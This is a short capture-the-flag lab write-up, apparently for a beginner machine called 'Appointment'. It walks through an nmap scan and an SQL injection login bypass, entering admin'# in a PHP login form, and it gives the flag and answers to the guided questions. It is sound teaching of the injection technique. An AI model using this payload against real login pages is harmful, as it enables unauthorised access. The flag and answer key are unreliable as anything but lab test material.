# Appointment

|            |                                                                            |
|------------|----------------------------------------------------------------------------|
| Track      | Starting Point - Tier 1                                                    |
| Difficulty | Very Easy                                                                  |
| OS         | Linux                                                                      |
| Tags       | Web, Databases, Injection, Apache, MariaDB, PHP, SQL, Reconnaissance, SQLi |
| Tools      | `nmap`, browser                                                            |

## Summary

A PHP login form whose backend builds the SQL query by string-concatenating
the username, then *separately* the password. The trick is realising the
password check has its own clause: comment it out and authentication
collapses to "does the username exist?".

## Solve

```bash
nmap -p 80 -sV <IP>
# 80/tcp open  http  Apache httpd 2.4.38 ((Debian))
```

The login form lives at `/`. Backend is presumably running:

```sql
SELECT * FROM users WHERE username = '<u>' AND password = '<p>'
```

Inject a comment in the username field to drop the password check entirely:

- **Username**: `admin'#`
- **Password**: anything

The query becomes:

```sql
SELECT * FROM users WHERE username = 'admin'#' AND password = '...'
```

Everything from `#` is treated as a SQL comment, so MariaDB only evaluates
`username = 'admin'`. The page returns the admin dashboard with the flag.

## Flag

```
e3d0796d002a446c0e622226f42e9672
```

## References

- [OWASP A03:2021 - Injection](https://owasp.org/Top10/A03_2021-Injection/)

## Guided Tasks

| #  | Question | Answer |
|----|----------|--------|
| 1  | What does the acronym SQL stand for? | Structured Query Language |
| 2  | What is one of the most common type of SQL vulnerabilities? | SQL Injection |
| 3  | What is the 2021 OWASP Top 10 classification for this vulnerability? | A03:2021 - Injection |
| 4  | What does Nmap report as the service and version that are running on port 80 of the target? | Apache httpd 2.4.38 ((Debian)) |
| 5  | What is the standard port used for the HTTPS protocol? | 443 |
| 6  | What is a folder called in web-application terminology? | directory |
| 7  | What is the HTTP response code is given for 'Not Found' errors? | 404 |
| 8  | Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains? | dir |
| 9  | What single character can be used to comment out the rest of a line in MySQL? | # |
| 10 | If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned? | Congratulations |
